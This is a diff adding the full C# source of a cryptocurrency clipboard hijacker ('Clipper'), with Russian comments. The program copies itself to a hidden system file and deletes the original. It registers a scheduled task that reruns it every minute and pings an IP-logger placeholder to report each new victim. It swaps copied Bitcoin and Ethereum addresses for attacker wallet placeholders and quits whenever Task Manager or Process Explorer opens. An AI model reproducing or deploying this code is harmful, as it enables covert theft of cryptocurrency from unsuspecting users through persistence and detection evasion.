@@ -1,0 +1,118 @@
+using System;
+using System.Diagnostics;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+using System.Net;
+using System.Text.RegularExpressions;
+using System.Reflection;
+
+namespace Clipper
+{
+    class Program
+    {
+        [STAThread]
+
+        static void Main(string[] args)
+        {
+            
+            string path = Environment.GetEnvironmentVariable("[path]") + "\\" + "[filename]";
+
+            if (!File.Exists(path))
+            {
+                File.Copy(Assembly.GetEntryAssembly().Location, path);
+                
+                // Самоудаление и добавление в планировщик заданий
+
+                ProcessStartInfo proc = new ProcessStartInfo();
+                proc.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Assembly.GetEntryAssembly().Location + "\" & schtasks /create /tn \\" + Path.GetRandomFileName().Split('.')[0] + "\\" + Path.GetRandomFileName().Split('.')[0] + " /tr " + path + " /st 00:00 /du 9999:59 /sc daily /ri 1 /f";
+                proc.WindowStyle = ProcessWindowStyle.Hidden;
+                proc.CreateNoWindow = true;
+                proc.FileName = "cmd.exe";
+
+                // Ставим аттрибуты Скрытый и Системный на файл
+
+                File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
+
+                // Стучим в IPLogger
+
+                try
+                {
+                    HttpWebRequest http = (HttpWebRequest)WebRequest.Create("[iplogger]");
+                    http.UserAgent = "New user!";
+                    http.GetResponse();
+                }
+                catch
+                { }
+                
+
+                Process.Start(proc);
+                Environment.Exit(0);
+
+            }
+
+            Thread th = new Thread(Monitor); // Чекаем процессы в отдельном потоке
+            th.Start();
+
+            while (true)
+            {
+                string idat_old  = string.Empty;
+                string idat = string.Empty;
+
+                Thread.Sleep(500);
+
+                try
+                {
+                    if (Clipboard.ContainsText())
+                    {
+                        idat = Clipboard.GetText();
+
+                        if (idat != idat_old)
+                        {
+                            // Ищем в clipboard адреса и если находим заменяем
+
+                            if (new Regex("^1[a-km-zA-HJ-NP-Z1-9]{25,34}$").IsMatch(idat))
+                            {
+                                new Thread(() => { Clipboard.SetText("[btcwallet1]"); }) { ApartmentState = ApartmentState.STA }.Start();
+                            }
+                            if (new Regex("^3[a-km-zA-HJ-NP-Z1-9]{25,34}$").IsMatch(idat))
+                            {
+                                new Thread(() => { Clipboard.SetText("[btcwallet2]"); }) { ApartmentState = ApartmentState.STA }.Start();
+                            }
+                            else if (new Regex("^0x[a-fA-F0-9]{40}$").IsMatch(idat))
+                            {
+                                new Thread(() => { Clipboard.SetText("[ethwallet]"); }) { ApartmentState = ApartmentState.STA }.Start();
+                            }
+
+                            idat_old = idat;
+                        }
+                    }
+                }
+                catch
+                {    }
+                
+            }
+        }
+
+        
+        static void Monitor()
+        {
+            while (true)
+            {
+                try
+                {
+                    foreach (Process item in Process.GetProcesses())
+                        if (item.ProcessName.ToLower() == "taskmgr"
+                            || item.ProcessName.ToLower() == "processhacker"
+                            || item.ProcessName.ToLower() == "procexp")
+                            Environment.Exit(0);
+
+                    Thread.Sleep(500);
+                }
+                catch
+                {   }
+                
+            }
+        }
+    }
+}
